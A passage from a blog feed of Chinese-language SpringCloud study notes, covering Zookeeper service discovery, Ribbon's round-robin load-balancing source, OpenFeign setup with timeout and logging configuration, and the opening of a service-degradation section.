<figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="meta">@GetMapping(<span class="string">&quot;/payment/zk&quot;</span>)</span></span><br><span class="line">    <span class="function"><span class="keyword">fun</span> <span class="title">discovery</span><span class="params">()</span></span>: Any &#123;</span><br><span class="line">        <span class="keyword">val</span> services = discoveryClient.services</span><br><span class="line">        services.forEach &#123;</span><br><span class="line">            log.info(<span class="string">&quot;*****element:<span class="variable">$it</span>&quot;</span>)</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">val</span> instances = discoveryClient.getInstances(<span class="string">&quot;cloud-provider-payment&quot;</span>)</span><br><span class="line">        instances.forEach &#123;</span><br><span class="line">            log.info(<span class="string">&quot;*****instance:<span class="subst">$&#123;it.uri&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> discoveryClient</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>访问方法如上<br>结果：<img src="https://image.zfxt.top/hexo-blog/SpringCloud(3)-2023-09-08-12-42.png"></p>
<p><strong>zookeeper没有自动保护机制，节点退出后立刻就会消失</strong></p>
<p>至于zookeeper的使用。与eureka类似。只要不写死调用端口，而使用服务名。即<code>private val url = &quot;http://cloud-provider-payment&quot;</code>一样可以实现负载均衡</p>
<h2 id="Consul"><a href="#Consul" class="headerlink" title="Consul"></a>Consul</h2><p><img src="https://image.zfxt.top/hexo-blog/SpringCloud(3)-2023-09-12-09-34.png"><br>不做具体配置。知道有这个东西即可。需要使用时，可以很容易的从以上两点得到启发。</p>
<h1 id="三者异同"><a href="#三者异同" class="headerlink" title="三者异同"></a>三者异同</h1><p><img src="https://image.zfxt.top/hexo-blog/SpringCloud(3)-2023-09-16-42-22.png"><br><img src="https://image.zfxt.top/hexo-blog/SpringCloud(3)-2023-09-20-37-52.png"><br><img src="https://image.zfxt.top/hexo-blog/SpringCloud(3)-2023-09-20-46-29.png"></p>
]]></content>
      <categories>
        <category>springcloud</category>
      </categories>
      <tags>
        <tag>SpringCloud</tag>
      </tags>
  </entry>
  <entry>
    <title>SpringCloud(4)</title>
    <url>/posts/7cf7a945/</url>
    <content><![CDATA[<h1 id="负载均衡"><a href="#负载均衡" class="headerlink" title="负载均衡"></a>负载均衡</h1><h2 id="Ribbon"><a href="#Ribbon" class="headerlink" title="Ribbon"></a>Ribbon</h2><p>Spring Cloud Ribbon是基于Netflix Ribbon3实现的一套客户端负载均衡的工具。<br>简单的说，Ribbon是Netflix发布的开源项目，主要功能是提供<strong>客户端的软件负载均衡算法和服务调用</strong>。Ribbon客户端组件提供一系列<br>完善的配置项如连接超时，重试等。简单的说，<strong>就是在配置文件中列出Load Balancer(简称LB)后面所有的机器，Ribbon会自动的帮<br>助你基于某种规则（如简单轮询，随机连接等）去连接这些机器</strong>。我们很容易使用Ribbo实现自定义的负载均衡算法。</p>
<p><strong>当前Ribbon已经进入维护阶段</strong></p>
<p><strong>LB负载均衡(Load Balance)是什么？</strong><br>简单的说就是将用户的请求平摊的分配到多个服务上，从而达到系统的HA(高可用)。<br>常见的负载均衡有软件Nginx,LVS,硬件F5等。</p>
<p><strong>Ribbon本地负载均衡客户端VS Nginx服务端负载均衡区别</strong><br>Nginx是服务器负载均衡，客户端所有请求都会交给nginx,然后由nginx实现转发请求。即负载均衡是由服务端实现的。<br>Ribbon本地负载均衡，在调用微服务接口时候，会在注册中心上获取注册信息服务列表之后缓存到)VM本地，从而在本地实现RPC远<br>程服务调用技术。<br>换种说法就是，Nginx属于集中式的负载均衡，Ribbon属于进程式负载均衡</p>
<blockquote>
<p>spring-cloud-starter-netflix-eureka-client自带了spring-cloud-starter–ribbon用</p>
</blockquote>
<h3 id="RestTemplate-负载均衡"><a href="#RestTemplate-负载均衡" class="headerlink" title="RestTemplate+负载均衡"></a>RestTemplate+负载均衡</h3><p>restTemplate的getForObject和getForEntity的区别：<br>但是主要使用的任然是getForObject<br><img src="https://image.zfxt.top/hexo-blog/SpringCloud(4)-2023-09-07-32-02.png"></p>
<h3 id="IRule"><a href="#IRule" class="headerlink" title="IRule"></a>IRule</h3><p><strong>根据特定算法从服务列表中抽取服务</strong><br>他的源码如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">IRule</span> &#123;</span><br><span class="line">    Server <span class="title function_">choose</span><span class="params">(Object var1)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">setLoadBalancer</span><span class="params">(ILoadBalancer var1)</span>;</span><br><span class="line"></span><br><span class="line">    ILoadBalancer <span class="title function_">getLoadBalancer</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这是一些实现方法<br><img src="https://image.zfxt.top/hexo-blog/SpringCloud(4)-2023-09-11-13-35.png"></p>
<p>替换负载均衡的规则：</p>
<blockquote>
<p>官方文档明确给出了警告：<br>这个自定义配置类不能放在@ComponentScan所扫描的当前包下以及子包下，<br>否则我们自定义的这个配置类就会被所有的Ribbon客户端所共享，达不到特殊化定制的目的了。<br>也就是所有的springboot中的项目都有@ComponentScan。因此你需要放在一个新的包下<br><img src="https://image.zfxt.top/hexo-blog/SpringCloud(4)-2023-09-16-06-20.png"></p>
</blockquote>
<ol>
<li><p>添加包，并生成新类<br><img src="https://image.zfxt.top/hexo-blog/SpringCloud(4)-2023-09-10-41-20.png"></p>
<figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">open</span> <span class="keyword">class</span> <span class="title class_">MySelfRule</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">open</span> <span class="function"><span class="keyword">fun</span> <span class="title">myRule</span><span class="params">()</span></span>: IRule &#123;</span><br><span class="line">        <span class="keyword">return</span> RandomRule() <span class="comment">// 随机</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>为主启动类添加注解</p>
<figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RibbonClient(name = <span class="string">&quot;CLOUD-PAYMENT-SERVICE&quot;</span>, configuration = [MySelfRule::class])</span></span><br><span class="line"><span class="keyword">open</span> <span class="keyword">class</span> <span class="title class_">OrderMain80</span></span><br></pre></td></tr></table></figure>
<p>然后即可</p>
</li>
</ol>
<h3 id="负载均衡-1"><a href="#负载均衡-1" class="headerlink" title="负载均衡"></a>负载均衡</h3><ol>
<li><p>轮询算法原理<br><img src="https://image.zfxt.top/hexo-blog/SpringCloud(4)-2023-09-09-30-44.png"></p>
</li>
<li><p>源码解析<br><img src="https://image.zfxt.top/hexo-blog/SpringCloud(4)-2023-09-17-40-56.png"></p>
</li>
</ol>
<p><strong>以下是轮询算法的源码：已添加注释</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RoundRobinRule</span> <span class="keyword">extends</span> <span class="title class_">AbstractLoadBalancerRule</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> AtomicInteger nextServerCyclicCounter;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">boolean</span> <span class="variable">AVAILABLE_ONLY_SERVERS</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">boolean</span> <span class="variable">ALL_SERVERS</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">Logger</span> <span class="variable">log</span> <span class="operator">=</span> LoggerFactory.getLogger(RoundRobinRule.class);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">RoundRobinRule</span><span class="params">()</span> &#123;</span><br><span class="line">        nextServerCyclicCounter = <span class="keyword">new</span> <span class="title class_">AtomicInteger</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">RoundRobinRule</span><span class="params">(ILoadBalancer lb)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>();</span><br><span class="line">        setLoadBalancer(lb);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Server <span class="title function_">choose</span><span class="params">(ILoadBalancer lb, Object key)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (lb == <span class="literal">null</span>) &#123;</span><br><span class="line">            log.warn(<span class="string">&quot;no load balancer&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">Server</span> <span class="variable">server</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">count</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (server == <span class="literal">null</span> &amp;&amp; count++ &lt; <span class="number">10</span>) &#123;</span><br><span class="line">            List&lt;Server&gt; reachableServers = lb.getReachableServers();</span><br><span class="line">            List&lt;Server&gt; allServers = lb.getAllServers();</span><br><span class="line">            <span class="type">int</span> <span class="variable">upCount</span> <span class="operator">=</span> reachableServers.size();</span><br><span class="line">            <span class="type">int</span> <span class="variable">serverCount</span> <span class="operator">=</span> allServers.size();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> ((upCount == <span class="number">0</span>) || (serverCount == <span class="number">0</span>)) &#123;</span><br><span class="line">                log.warn(<span class="string">&quot;No up servers available from load balancer: &quot;</span> + lb);</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="type">int</span> <span class="variable">nextServerIndex</span> <span class="operator">=</span> incrementAndGetModulo(serverCount);</span><br><span class="line">            server = allServers.get(nextServerIndex);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (server == <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="comment">/* Transient. */</span></span><br><span class="line">                Thread.<span class="keyword">yield</span>();</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (server.isAlive() &amp;&amp; (server.isReadyToServe())) &#123;</span><br><span class="line">                <span class="keyword">return</span> (server);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Next.</span></span><br><span class="line">            server = <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (count &gt;= <span class="number">10</span>) &#123;</span><br><span class="line">            log.warn(<span class="string">&quot;No available alive servers after 10 tries from load balancer: &quot;</span></span><br><span class="line">                    + lb);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> server;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Inspired by the implementation of &#123;<span class="doctag">@link</span> AtomicInteger#incrementAndGet()&#125;.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> modulo The modulo to bound the value of the counter.</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> The next value.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> <span class="title function_">incrementAndGetModulo</span><span class="params">(<span class="type">int</span> modulo)</span> &#123;</span><br><span class="line">        <span class="keyword">for</span> (;;) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">current</span> <span class="operator">=</span> nextServerCyclicCounter.get();</span><br><span class="line">            <span class="type">int</span> <span class="variable">next</span> <span class="operator">=</span> (current + <span class="number">1</span>) % modulo;</span><br><span class="line">            <span class="keyword">if</span> (nextServerCyclicCounter.compareAndSet(current, next))</span><br><span class="line">                <span class="keyword">return</span> next;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Server <span class="title function_">choose</span><span class="params">(Object key)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> choose(getLoadBalancer(), key);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">initWithNiwsConfig</span><span class="params">(IClientConfig clientConfig)</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>轮询算法的关键是：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="type">int</span> <span class="title function_">incrementAndGetModulo</span><span class="params">(<span class="type">int</span> modulo)</span> &#123;</span><br><span class="line">        <span class="keyword">for</span> (;;) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">current</span> <span class="operator">=</span> nextServerCyclicCounter.get();</span><br><span class="line">            <span class="type">int</span> <span class="variable">next</span> <span class="operator">=</span> (current + <span class="number">1</span>) % modulo;</span><br><span class="line">            <span class="keyword">if</span> (nextServerCyclicCounter.compareAndSet(current, next))</span><br><span class="line">                <span class="keyword">return</span> next;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>解释：</p>
<ol>
<li><p>原子类型<br>AtomicInteger类是系统底层保护的int类型，通过提供执行方法的控制进行值的原子操作。AtomicInteger它不能当作Integer来使用</p>
</li>
<li><p>自旋锁<br>自旋锁的定义：当一个线程尝试去获取某一把锁的时候，如果这个锁此时已经被别人获取(占用)，那么此线程就无法获取到这把锁，该线程将会等待，间隔一段时间后会再次尝试获取。这种采用循环加锁 -&gt; 等待的机制被称为自旋锁(spinlock)。</p>
</li>
</ol>
<p>如果这个原子int类型的数据跟新为了next。那么就让他返回true。然后结束循环。他就可以获得正确的序号。系统会通过<code>server = allServers.get(nextServerIndex);</code>实现返回对应的服务器给调用对象</p>
<h2 id="OpenFeign"><a href="#OpenFeign" class="headerlink" title="OpenFeign"></a>OpenFeign</h2><p>Feign,是一个声明式WebService客户端。使用Feign能让编写Web Service客户端更加简单。<br>它的使用方法是定义一个服务接口然后在上面添加注解。Feign也支持可拔插式的编码器和解码器。Spring Cloud对Feign进行了封装,使其支持了Spring MVC标准注解和HttpMessageConverters。Feign可以与Eureka和Ribbon组合使用以支持负载均衡</p>
<p><strong>Feign能干什么？</strong><br>Feign旨在使编写Java Http客户端变得更容易。<br>前面在使用Ribbon+RestTemplatel时，利用RestTemplate对http请求的封装处理，形成了一套模版化的调用方法。但是在实际开发中，由于对服务依赖的调用可能不止一处，往往一个接口会被多处调用，所以通常都会针对每个微服务自行封装一些客户端类来包装这些依赖服务的调用。所以，Feign在此基础上做了进一步封装，由他来帮助我们定义和实现依赖服务接口的定义。在Feign的实现下我们只需创建一个接口并使用注解的方式来配置它（以前是Dao接口上面标注Mapper注解，现在是一个微服务接口上面标注一个Feign注解即可，即可完成对服务提供方的接口绑定，简化了使用Spring cloud Ribbon时，自动封装服务调用客户端的开发量。<br><strong>Feign集成了Ribbon</strong>。利用Ribbon维护了Payment的服务列表信息，并且通过轮询实现了客户端的负载均衡。而与Ribbon不同的是，通过feign.只需要定义服务绑定接口且以声明式的方法，优雅而简单的实现了服务调用<br><img src="https://image.zfxt.top/hexo-blog/SpringCloud(4)-2023-09-12-17-28.png"></p>
<h3 id="使用步骤"><a href="#使用步骤" class="headerlink" title="使用步骤"></a>使用步骤</h3><ol>
<li><p>接口+注解<br>微服务调用接口+<code>@FeignClient</code></p>
</li>
<li><p>新建cloud-consumer-feign-order80</p>
</li>
<li><p>POM</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.cloud<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-cloud-starter-openfeign<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!--            引入自己的api通用包--&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>top.zfxt.springcloud<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>cloud-api-commons<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>$&#123;project.version&#125;<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">&lt;!-- https://mvnrepository.com/artifact/org.jetbrains.kotlin/kotlin-reflect --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.jetbrains.kotlin<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>kotlin-reflect<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.9.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">scope</span>&gt;</span>runtime<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">&lt;!-- https://mvnrepository.com/artifact/org.springframework.boot/spring-boot-starter-web --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-web<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!-- 这样排除依赖会导致下图所示的问题 --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">exclusions</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">exclusion</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.fasterxml.jackson.core<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jackson-databind<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">exclusion</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">exclusions</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--         Gson--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.google.code.gson<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>gson<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">&lt;!--        eureka客户端--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.cloud<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-cloud-starter-netflix-eureka-client<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">&lt;!-- https://mvnrepository.com/artifact/org.springframework.boot/spring-boot-starter-web --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-actuator<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure></li>
<li><p>YML</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">server:</span></span><br><span class="line">  <span class="attr">port:</span> <span class="number">80</span></span><br><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">application:</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">cloud-consumer-server</span></span><br><span class="line"></span><br><span class="line"><span class="attr">eureka:</span></span><br><span class="line">  <span class="attr">client:</span></span><br><span class="line">    <span class="attr">service-url:</span></span><br><span class="line">      <span class="attr">defaultZero:</span> <span class="string">http://localhost:7001/eureka,http://localhost:7002/eureka</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>主启动</p>
<figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="meta">@SpringBootApplication(exclude = [JacksonAutoConfiguration::class])</span></span><br><span class="line"><span class="meta">@EnableFeignClients</span></span><br><span class="line"><span class="keyword">open</span> <span class="keyword">class</span> <span class="title class_">OrderFeignMain80</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">fun</span> <span class="title">main</span><span class="params">(args: <span class="type">Array</span>&lt;<span class="type">String</span>&gt;)</span></span> &#123;</span><br><span class="line">    runApplication&lt;OrderFeignMain80&gt;(*args)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>业务类<br>直接定义<strong>PaymentFeignService</strong>接口。然后写方法体即可。</p>
<figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="meta">@FeignClient(<span class="string">&quot;CLOUD-PAYMENT-SERVICE&quot;</span>)</span></span><br><span class="line"><span class="keyword">interface</span> <span class="title class_">PaymentFeignService</span> &#123;</span><br><span class="line">    <span class="meta">@GetMapping(<span class="string">&quot;/payment/get/&#123;id&#125;&quot;</span>)</span></span><br><span class="line">    <span class="function"><span class="keyword">fun</span> <span class="title">getPaymentById</span><span class="params">(<span class="meta">@PathVariable(<span class="string">&quot;id&quot;</span>)</span> id: <span class="type">Long</span>)</span></span>: CommonResult&lt;*&gt;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>Controller</strong></p>
<figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">OrderFeignController</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Resource</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">lateinit</span> <span class="keyword">var</span> paymentFeignService: PaymentFeignService</span><br><span class="line"></span><br><span class="line">    <span class="meta">@GetMapping(<span class="string">&quot;/get/&#123;id&#125;&quot;</span>)</span></span><br><span class="line">    <span class="function"><span class="keyword">fun</span> <span class="title">getPaymentById</span><span class="params">(<span class="meta">@PathVariable(<span class="string">&quot;id&quot;</span>)</span> id:<span class="type">Long</span>)</span></span>: CommonResult&lt;Payment&gt; &#123;</span><br><span class="line">        <span class="keyword">return</span> paymentFeignService.getPaymentById(id)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://image.zfxt.top/hexo-blog/SpringCloud(4)-2023-09-22-14-45.png"></p>
</li>
</ol>
<h3 id="超时控制"><a href="#超时控制" class="headerlink" title="超时控制"></a>超时控制</h3><p>OpenFeign默认等待一秒钟，超过一秒钟读取的都算是超时的。超过既报错<br>而控制他的超时时间是由Ribbon来决定的。看到<code>application.yml</code>：</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">server:</span></span><br><span class="line">  <span class="attr">port:</span> <span class="number">80</span></span><br><span class="line"></span><br><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">application:</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">cloud-consumer-server</span></span><br><span class="line"></span><br><span class="line"><span class="attr">eureka:</span></span><br><span class="line">  <span class="attr">client:</span></span><br><span class="line">    <span class="attr">serviceUrl:</span></span><br><span class="line">      <span class="comment">#      defaultZone: http://localhost:7001/eureka</span></span><br><span class="line">      <span class="attr">defaultZone:</span> <span class="string">http://eureka7001.com:7001/eureka,http://eureka7002.com:7002/eureka</span> <span class="comment"># 集群版</span></span><br><span class="line"></span><br><span class="line"><span class="attr">feign:</span></span><br><span class="line">  <span class="attr">client:</span></span><br><span class="line">    <span class="attr">config:</span></span><br><span class="line">      <span class="attr">default:</span></span><br><span class="line">        <span class="comment"># 连接超时时间，默认2s，设置单位为毫秒</span></span><br><span class="line">        <span class="attr">connectTimeout:</span> <span class="number">8000</span></span><br><span class="line">        <span class="comment"># 请求处理超时时间，默认5s，设置单位为毫秒。</span></span><br><span class="line">        <span class="attr">readTimeout:</span> <span class="number">10000</span></span><br></pre></td></tr></table></figure>


<h3 id="日志打印功能"><a href="#日志打印功能" class="headerlink" title="日志打印功能"></a>日志打印功能</h3><h4 id="日志级别"><a href="#日志级别" class="headerlink" title="日志级别"></a>日志级别</h4><p>NONE:默认的，不显示任何日志；<br>BASIC:仅记录请求方法、URL、响应状态码及执行时间；<br>HEADERS:除了BASIC中定义的信息之外，还有请求和响应的头信息；<br>FULL:除了HEADERS中定义的信息之外，还有请求和响应的正文及元数据。</p>
<p>配置：</p>
<figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> top.zfxt.springcloud.config</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> feign.Logger</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.<span class="keyword">annotation</span>.Bean</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.<span class="keyword">annotation</span>.Configuration</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *  <span class="doctag">@author</span>:zfxt</span></span><br><span class="line"><span class="comment"> *  <span class="doctag">@version</span>:1.0</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">open</span> <span class="keyword">class</span> <span class="title class_">FeignConfig</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">open</span> <span class="function"><span class="keyword">fun</span>  <span class="title">feighLoggerLevel</span><span class="params">()</span></span>:Logger.Level&#123;</span><br><span class="line">        <span class="keyword">return</span> Logger.Level.FULL</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>添加到启动的配置项中</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">logging:</span></span><br><span class="line">  <span class="attr">level:</span></span><br><span class="line">    <span class="comment"># feigh日志以什么级别监控哪个接口</span></span><br><span class="line">    <span class="attr">top.zfxt.springcloud.service.PaymentFeighService:</span> <span class="string">debug</span></span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>springcloud</category>
      </categories>
      <tags>
        <tag>SpringCloud</tag>
      </tags>
  </entry>
  <entry>
    <title>SpringCloud(5)</title>
    <url>/posts/65ec9804/</url>
    <content><![CDATA[<h1 id="服务降级"><a href="#服务降级" class="headerlink" title="服务降级"></a>服务降级</h1><blockquote>
<p>服务雪崩<br>多个微服务之间调用的时候，假设微服务A调用微服务B和微服务C,微服务B和微服务C又调用其它的微服务，这就是所谓的“扇出”<br>如果扇出的链路上某个微服务的调用响应时间过长或者不可用，对微服务A的调用就会占用越来越多的系统资源，进而引起系统崩溃，所谓的“雪崩效应”.<br>对于高流量的应用来说，单一的后端依赖可能会导致所有服务器上的所有资源都在几秒钟内饱和。比失败更糟糕的是，这些应用程序还可能导致服务之间的延迟增加，备份队列，线程和其他系统资源紧张，导致整个系统发生更多的级联故障。这些都表示需要对故障和延迟进行隔离和管理，以便单个依赖关系的失败，不能取消整个应用程序或系统。</p>
</blockquote>
